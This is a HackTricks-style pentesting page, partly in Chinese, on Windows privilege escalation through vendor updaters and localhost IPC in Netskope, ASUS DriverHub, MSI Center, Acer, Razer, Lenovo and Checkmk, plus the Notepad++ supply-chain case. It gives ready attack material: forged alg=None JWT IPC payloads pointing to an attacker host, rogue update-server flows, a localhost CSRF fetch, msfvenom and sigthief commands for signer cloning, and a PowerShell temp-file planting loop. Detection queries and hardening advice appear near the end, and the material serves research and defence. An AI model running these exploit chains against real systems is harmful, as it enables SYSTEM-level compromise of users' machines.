# 滥用 Enterprise Auto-Updaters 和 Privileged IPC（例如，Netskope、ASUS 和 MSI）

{{#include ../../banners/hacktricks-training.md}}

本页概括了一类在 enterprise endpoint agents 和 updaters 中发现的 Windows local privilege escalation 链，这类组件暴露了低门槛的 IPC surface 和 privileged update flow。一个代表性例子是 Windows < R129 的 Netskope Client（CVE-2025-0309），其中低权限用户可以强制重新 enroll 到攻击者控制的 server，然后投递一个恶意 MSI，由 SYSTEM service 安装。

你可以在类似产品上复用的关键思路：
- 滥用 privileged service 的 localhost IPC，强制重新 enroll 或重新配置到攻击者的 server。
- 实现厂商的 update endpoints，投递一个 rogue Trusted Root CA，并把 updater 指向一个恶意的、“signed” package。
- 绕过弱 signer checks（CN allow-lists）、可选的 digest flags，以及宽松的 MSI properties。
- 如果 IPC 是“encrypted”的，从 registry 中存储的、world-readable 的 machine identifiers 推导 key/IV。
- 如果 service 通过 image path/process name 限制调用者，则注入到一个 allow-listed process，或以 suspended 方式启动它，并用最小化的 thread-context patch 引导你的 DLL。

---
## 1) 通过 localhost IPC 强制 enroll 到攻击者 server

许多 agents 都带有一个 user-mode UI process，它通过 localhost TCP 使用 JSON 与 SYSTEM service 通信。

在 Netskope 中观察到：
- UI: stAgentUI（low integrity）↔ Service: stAgentSvc（SYSTEM）
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

利用流程：
1) 构造一个 JWT enrollment token，其 claims 可控制 backend host（例如 AddonUrl）。使用 alg=None，这样不需要签名。
2) 发送调用 provisioning command 的 IPC message，带上你的 JWT 和 tenant name：
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) 该 service 开始向你的 rogue server 发送 enrollment/config 请求，例如：
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notes:
- 如果 caller verification 是基于 path/name 的，就从一个 allow-listed vendor binary 发起请求（见 §4）。

---
## 2) Hijacking the update channel to run code as SYSTEM

一旦 client 与你的 server 通信，就实现预期的 endpoints，并将其引导到一个 attacker MSI。典型流程：

1) /v2/config/org/clientconfig → 返回带有非常短的 updater interval 的 JSON config，例如：
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → 返回一个 PEM CA certificate。该服务会将其安装到 Local Machine Trusted Root store 中。
3) /v2/checkupdate → 提供指向 malicious MSI 的 metadata 和一个 fake version。

绕过现实中常见检查：
- Signer CN allow-list: 该服务可能只检查 Subject CN 是否等于 “netSkope Inc” 或 “Netskope, Inc.”。你的 rogue CA 可以签发一个带该 CN 的 leaf 并签署 MSI。
- CERT_DIGEST property: 包含一个名为 CERT_DIGEST 的 benign MSI property。安装时不做 enforcement。
- Optional digest enforcement: config flag（例如，check_msi_digest=false）会禁用额外的 cryptographic validation。

结果：SYSTEM service 会从
C:\ProgramData\Netskope\stAgent\data\*.msi
安装你的 MSI，并以 NT AUTHORITY\SYSTEM 执行任意代码。

Patch-bypass lesson: 如果厂商通过 allow-list 一小组“trusted” domains 来响应，而不是对 update source 做 cryptographic authentication，那么就去找仍然能让你 steer traffic 的 vendor-owned redirectors 或 reverse proxies。在 Netskope 的案例中，公开的后续 research 显示，R129-era allow-list 仍可通过 `rproxy.goskope.com` 被 abuse，它会代理 attacker-controlled Azure App Service content。把 hostname allow-lists 看作减速带，而不是 trust boundary。

---
## 3) Forging encrypted IPC requests (when present)

从 R127 开始，Netskope 将 IPC JSON 封装在一个看起来像 Base64 的 encryptData 字段中。逆向显示其使用 AES，key/IV 由任何用户都可读取的 registry values 派生：
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

攻击者可以复现加密，并从 standard user 发送有效的 encrypted commands。通用提示：如果某个 agent 突然开始“encrypt”它的 IPC，去找 HKLM 下的 device IDs、product GUIDs、install IDs 之类的 material。

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

有些服务会尝试通过解析 TCP connection 的 PID，并将 image path/name 与位于 Program Files 下的 vendor binaries allow-listed 进行比对来认证 peer（例如，stagentui.exe、bwansvc.exe、epdlp.exe）。

两个实用绕过方式：
- 对 allow-listed process（例如，nsdiag.exe）进行 DLL injection，并在其内部 proxy IPC。
- 以 suspended 方式启动一个 allow-listed binary，然后在不使用 CreateRemoteThread 的情况下 bootstrap 你的 proxy DLL（见 §5），以满足 driver-enforced tamper rules。

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

产品通常会附带一个 minifilter/OB callbacks driver（例如，Stadrv），用来从受保护进程的 handle 中剥离危险权限：
- Process: 移除 PROCESS_TERMINATE、PROCESS_CREATE_THREAD、PROCESS_VM_READ、PROCESS_DUP_HANDLE、PROCESS_SUSPEND_RESUME
- Thread: 仅限制为 THREAD_GET_CONTEXT、THREAD_QUERY_LIMITED_INFORMATION、THREAD_RESUME、SYNCHRONIZE

一个可靠的、遵守这些约束的 user-mode loader：
1) 以 CREATE_SUSPENDED 的方式 CreateProcess 一个 vendor binary。
2) 获取你仍然被允许使用的 handles：进程的 PROCESS_VM_WRITE | PROCESS_VM_OPERATION，以及线程的 THREAD_GET_CONTEXT/THREAD_SET_CONTEXT handle（或者如果你在已知 RIP 处 patch code，则只需要 THREAD_RESUME）。
3) 覆写 ntdll!NtContinue（或其他早期、保证已映射的 thunk）为一个很小的 stub：它调用 LoadLibraryW 加载你的 DLL path，然后跳回。
4) 调用 ResumeThread，在进程内触发你的 stub，从而加载你的 DLL。

因为你从未对一个已经受保护的进程使用 PROCESS_CREATE_THREAD 或 PROCESS_SUSPEND_RESUME（是你创建了它），所以 driver 的 policy 会被满足。

---
## 6) Practical tooling
- NachoVPN（Netskope plugin）会自动化创建 rogue CA、签署 malicious MSI，并提供所需 endpoints：/v2/config/org/clientconfig、/config/ca/cert、/v2/checkupdate。
- UpSkope 是一个自定义 IPC client，可构造任意（可选 AES-encrypted）的 IPC messages，并包含 suspended-process injection，以便从 allow-listed binary 发起。

## 7) Fast triage workflow for unknown updater/IPC surfaces

当面对一个新的 endpoint agent 或 motherboard “helper” suite 时，一个快速工作流通常就足以判断你是否在面对一个有希望的 privesc target：

1) 枚举 loopback listeners，并将它们映射回 vendor processes：
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) 枚举候选命名管道:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) 挖掘由基于插件的 IPC servers 使用的 registry-backed routing data：
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) 先从 user-mode client 中提取 endpoint 名称、JSON keys 和 command IDs。打包的 Electron/.NET frontends 经常会泄漏完整 schema：
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
5) 寻找实际的 trust predicate，而不只是最终启动进程的代码路径：
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
-Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```
Patterns worth prioritizing:
- `CryptQueryObject`/certificate parsing without `WinVerifyTrust` usually means “certificate exists” was treated as “certificate is trusted”, enabling certificate cloning or other fake-signer tricks.
- Substring/suffix checks over `Origin`, `Referer`, download URLs, process names, or signer CNs are not authentication. `contains(".vendor.com")` is usually exploitable with attacker-controlled lookalike domains.
- If the low-privileged GUI decides “the file is trusted” and the SYSTEM broker merely consumes that result, patching or reimplementing the client-side DLL/JS often bypasses the boundary entirely (Razer-style split validation).
- If the broker copies a payload to `%TEMP%`/`C:\Windows\Temp` and then validates or schedules it from that path, immediately test for TOCTOU replacement windows and for sibling plugin modules that expose alternate `ExecuteTask()` wrappers with weaker checks.

For named-pipe-heavy targets, PipeViewer is a quick way to spot weak DACLs and remotely reachable pipes before you start reversing the protocol in depth.

If the target authenticates callers only by PID, image path, or process name, treat that as a speed bump rather than a boundary: injecting into the legitimate client, or making the connection from an allow-listed process, is often enough to satisfy the server’s checks. For named pipes specifically, [this page about client impersonation and pipe abuse](named-pipe-client-impersonation.md) covers the primitive in more depth.

---
## 8) 模块化 add-in broker 仅通过 vendor signatures 认证（Lenovo Vantage pattern）

一种值得关注的新变体是 **signed-client RPC broker**：一个低权限、由 Lenovo 签名的桌面进程与一个 SYSTEM service 通信，而该 service 会把 JSON commands 路由到 `%ProgramData%` 下的一组 XML 描述的 add-ins。只要在**任何被接受的已签名 client 内部**获得 code execution，所有 `runas="system"` contract 都会变成你的攻击面。

Lenovo Vantage research 中观察到的高价值 primitive：
- **因为 caller 由 vendor 签名就信任它**：研究人员通过把一个 Lenovo-signed EXE 复制到可写目录，并满足一个 DLL side-load (`profapi.dll`)，进入了 authenticated context，从而让 arbitrary code 在 service 已经信任的 client 内部执行。
- **基于 manifest 的攻击面发现**：add-ins 在 `C:\ProgramData\Lenovo\Vantage\Addins\*.xml` 下声明；多个 contract 以 `SYSTEM` 运行，因此枚举这些 manifests 往往比逆向 broker 本身更快揭示真正的 privileged verbs。
- **认证通道背后的 per-command bugs**：一旦进入被信任的 client，公开 research 发现了 update/install verbs 中的 path-traversal + race conditions、privileged settings databases 中的 raw-SQL abuse，以及基于 substring 的 registry path checks，从而可以把写入扩展到预期 hive 之外。

在目标上的有用 recon：
```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
-Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```
Practical takeaway: whenever a helper suite exposes a broker that first authenticates the **caller process** and only then dispatches into dozens of plugin/add-in commands, do not stop after bypassing the front-door trust check. Dump the manifest/contract table and fuzz each high-privilege verb independently; the authenticated channel usually hides several second-stage bugs.

---
## 1) Browser-to-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub ships a user-mode HTTP service (ADU.exe) on 127.0.0.1:53000 that expects browser calls coming from https://driverhub.asus.com. The origin filter simply performs `string_contains(".asus.com")` over the Origin header and over download URLs exposed by `/asus/v1.0/*`. Any attacker-controlled host such as `https://driverhub.asus.com.attacker.tld` therefore passes the check and can issue state-changing requests from JavaScript. See [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) for additional bypass patterns.

Practical flow:
1) Register a domain that embeds `.asus.com` and host a malicious webpage there.
2) Use `fetch` or XHR to call a privileged endpoint (e.g., `Reboot`, `UpdateApp`) on `http://127.0.0.1:53000`.
3) Send the JSON body expected by the handler – the packed frontend JS shows the schema below.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
即使下面显示的 PowerShell CLI 在将 Origin header 伪造成受信任的值时也会成功：
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Any browser visit to the attacker site therefore becomes a 1-click (or 0-click via `onload`) local CSRF that drives a SYSTEM helper.

---
## 2) Insecure code-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` downloads arbitrary executables defined in the JSON body and caches them in `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Download URL validation reuses the same substring logic, so `http://updates.asus.com.attacker.tld:8000/payload.exe` is accepted. After download, ADU.exe merely checks that the PE contains a signature and that the Subject string matches ASUS before running it – no `WinVerifyTrust`, no chain validation.

To weaponize the flow:
1) Create a payload (e.g., `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clone ASUS’s signer into it (e.g., `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Host `pwn.exe` on a `.asus.com` lookalike domain and trigger UpdateApp via the browser CSRF above.

Because both the Origin and URL filters are substring-based and the signer check only compares strings, DriverHub pulls and executes the attacker binary under its elevated context.

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

MSI Center’s SYSTEM service exposes a TCP protocol where each frame is `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. The core component (Component ID `0f 27 00 00`) ships `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Its handler:
1) Copies the supplied executable to `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifies the signature via `CS_CommonAPI.EX_CA::Verify` (certificate subject must equal “MICRO-STAR INTERNATIONAL, CO., LTD.” and `WinVerifyTrust` succeeds).
3) Creates a scheduled task that runs the temp file as SYSTEM with attacker-controlled arguments.

The copied file is not locked between verification and `ExecuteTask()`. An attacker can:
- Send Frame A pointing to a legitimate MSI-signed binary (guarantees the signature check passes and the task is queued).
- Race it with repeated Frame B messages that point to a malicious payload, overwriting `MSI Center SDK.exe` just after verification completes.

When the scheduler fires, it executes the overwritten payload under SYSTEM despite having validated the original file. Reliable exploitation uses two goroutines/threads that spam CMD_AutoUpdateSDK until the TOCTOU window is won.

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Every plugin/DLL loaded by `MSI.CentralServer.exe` receives a Component ID stored under `HKLM\SOFTWARE\MSI\MSI_CentralServer`. The first 4 bytes of a frame select that component, allowing attackers to route commands to arbitrary modules.
- Plugins can define their own task runners. `Support\API_Support.dll` exposes `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` and directly calls `API_Support.EX_Task::ExecuteTask()` with **no signature validation** – any local user can point it at `C:\Users\<user>\Desktop\payload.exe` and get SYSTEM execution deterministically.
- Sniffing loopback with Wireshark or instrumenting the .NET binaries in dnSpy quickly reveals the Component ↔ command mapping; custom Go/ Python clients can then replay frames.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) exposes `\\.\pipe\treadstone_service_LightMode`, and its discretionary ACL allows remote clients (e.g., `\\TARGET\pipe\treadstone_service_LightMode`). Sending command ID `7` with a file path invokes the service’s process-spawning routine.
- The client library serializes a magic terminator byte (113) along with args. Dynamic instrumentation with Frida/`TsDotNetLib` (see [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) for instrumentation tips) shows that the native handler maps this value to a `SECURITY_IMPERSONATION_LEVEL` and integrity SID before calling `CreateProcessAsUser`.
- Swapping 113 (`0x71`) for 114 (`0x72`) drops into the generic branch that keeps the full SYSTEM token and sets a high-integrity SID (`S-1-16-12288`). The spawned binary therefore runs as unrestricted SYSTEM, both locally and cross-machine.
- Combine that with the exposed installer flag (`Setup.exe -nocheck`) to stand up ACC even on lab VMs and exercise the pipe without vendor hardware.

These IPC bugs highlight why localhost services must enforce mutual authentication (ALPC SIDs, `ImpersonationLevel=Impersonation` filters, token filtering) and why every module’s “run arbitrary binary” helper must share the same signer verifications.

---
## 3) COM/IPC “elevator” helpers backed by weak user-mode validation (Razer Synapse 4)

Razer Synapse 4 added another useful pattern to this family: a low-privileged user can ask a COM helper to launch a process through `RzUtility.Elevator`, while the trust decision is delegated to a user-mode DLL (`simple_service.dll`) rather than being enforced robustly inside the privileged boundary.

Observed exploitation path:
- Instantiate the COM object `RzUtility.Elevator`.
- Call `LaunchProcessNoWait(<path>, "", 1)` to request an elevated launch.
- In the public PoC, the PE-signature gate inside `simple_service.dll` is patched out before issuing the request, allowing an arbitrary attacker-chosen executable to be launched.

Minimal PowerShell invocation:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
总体要点：在分析“helper”套件时，不要只停留在 localhost TCP 或 named pipes。要检查是否存在名为 `Elevator`、`Launcher`、`Updater` 或 `Utility` 的 COM classes，然后确认特权服务是真正验证了目标二进制本身，还是只是信任由可被 patch 的 user-mode client DLL 计算出来的结果。这个模式并不只适用于 Razer：任何高权限 broker 从低权限一侧接收 allow/deny 决策的分离式设计，都是潜在的 privesc surface。


---
## MSI repair 期间可预测的 temp script 执行（Checkmk Agent / CVE-2024-0670）

一些 Windows agents 仍然通过把临时 `.cmd` 写入 `C:\Windows\Temp` 并以 `SYSTEM` 执行来实现特权操作。如果文件名是可预测的，而且服务没有安全地重新创建已存在文件，那么低权限用户就可以预先把未来的 temp file 创建为 **read-only**，让特权进程执行攻击者控制的内容，而不是它自己的脚本。

在受影响的 Checkmk Agent builds 中观察到：
- temp pattern: `cmk_all_<PID>_1.cmd`
- 受影响分支: `2.0.0`, `2.1.0`, `2.2.0`
- 触发方式: 对缓存的 agent package 执行 MSI **repair**

实际操作流程：
1. 根据当前进程 ID 或正在运行的 agent PID 估计一个合理的 PID 范围。
2. 写入一个简短的 **ASCII** `.cmd` payload（`Set-Content -Encoding Ascii` 或 `cmd.exe` 重定向；batch files 避免使用 UTF-16 PowerShell 输出）。
3. 在候选范围内批量创建 `C:\Windows\Temp\cmk_all_<PID>_1.cmd`，并将每个文件标记为 read-only。
4. 触发缓存的 MSI 的 repair，使特权服务尝试重新生成，然后执行这个 temp script。
```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```
如果易受攻击的产品是通过 Windows Installer 安装的，在触发修复之前，先将 `C:\Windows\Installer` 下随机看起来的缓存 MSI 映射回其产品名称：
```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
ForEach-Object {
$p = Get-ItemProperty $_.PSPath
[PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
} | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```
Operational notes:
- `qwinsta` is useful when `msiexec /fa` fails from a non-interactive WinRM shell and you need to understand whether an existing desktop/disconnected session can trigger the repair correctly.
- This pattern generalizes to other endpoint agents and updaters that **stage temp scripts in world-writable locations and later execute them as SYSTEM**. Test for predictable names, missing exclusive create semantics, and repair/update flows that can be triggered on demand.

---
## 通过弱 updater 验证进行 Remote supply-chain hijack（WinGUp / Notepad++）

在 2025 年 6 月到 2025 年 12 月之间，攻击者入侵了 Notepad++ update flow 背后的 hosting infrastructure，并有选择地向特定受害者投递恶意 manifest。较旧的基于 WinGUp 的 updater 并未完整验证 update 的真实性，因此恶意的 XML 响应可以将客户端重定向到攻击者控制的 URL。由于客户端在未强制检查可信 certificate chain 和已下载安装包的有效 PE signature 的情况下接受了 HTTPS 内容，受害者下载并执行了木马化的 NSIS `update.exe`。

Operational flow（不需要本地 exploit）：
1. **Infrastructure interception**：入侵 CDN/hosting，并用指向恶意 download URL 的攻击者 metadata 响应 update 检查。
2. **Trojanized NSIS**：安装程序获取/执行 payload，并滥用两条 execution chains：
- **Bring-your-own signed binary + sideload**：捆绑已签名的 Bitdefender `BluetoothService.exe`，并在其 search path 中放置恶意 `log.dll`。当该已签名 binary 运行时，Windows 会 sideload `log.dll`，它会解密并 reflective load Chrysalis backdoor（Warbird-protected + API hashing 以阻碍 static detection）。
- **Scripted shellcode injection**：NSIS 执行一个编译后的 Lua script，该脚本使用 Win32 APIs（例如 `EnumWindowStationsW`）来注入 shellcode 并 stage Cobalt Strike Beacon。

适用于任何 auto-updater 的 hardening/detection 要点：
- 对下载的安装包强制执行 **certificate + signature verification**（pin vendor signer，拒绝不匹配的 CN/chain），并对 update manifest 本身签名（例如 XMLDSig）。除非已验证，否则阻止由 manifest 控制的 redirect。
- 将 **BYO signed binary sideloading** 视为一个 post-download detection pivot：当已签名的 vendor EXE 从其 canonical install path 之外加载 DLL 名称时进行告警（例如 Bitdefender 从 Temp/Downloads 加载 `log.dll`），以及当 updater 从 temp 放置/执行带有非 vendor signature 的 installer 时进行告警。
- 监控此链中观察到的 **malware-specific artifacts**（也可作为通用 pivot）：mutex `Global\Jdhfv_1.0.1`、异常的 `gup.exe` 向 `%TEMP%` 的写入，以及 Lua 驱动的 shellcode injection stages。
- Notepad++ 在 v8.8.9 及之后版本通过增强 WinGUp 作出响应：返回的 XML 现在已签名（XMLDSig），并且新版本强制对下载的安装包进行 certificate + signature verification，而不再仅信任传输本身。

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> 启动一个非 Notepad++ 安装程序</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

这些 patterns 可泛化到任何接受未签名 manifests 或未固定 installer signers 的 updater——network hijack + malicious installer + BYO-signed sideloading 可在“trusted” updates 的伪装下实现 remote code execution。

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [SEC Consult – Local Privilege Escalation via writable files in Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [Checkmk Werk #16361 – Privilege escalation in Windows agent](https://checkmk.com/werk/16361)
- [RunasCs](https://github.com/antonioCoco/RunasCs)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [AmberWolf – Bypassing the fix for CVE-2025-0309 in Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Atredis – Uncovering Privilege Escalation Bugs in Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)

{{#include ../../banners/hacktricks-training.md}}
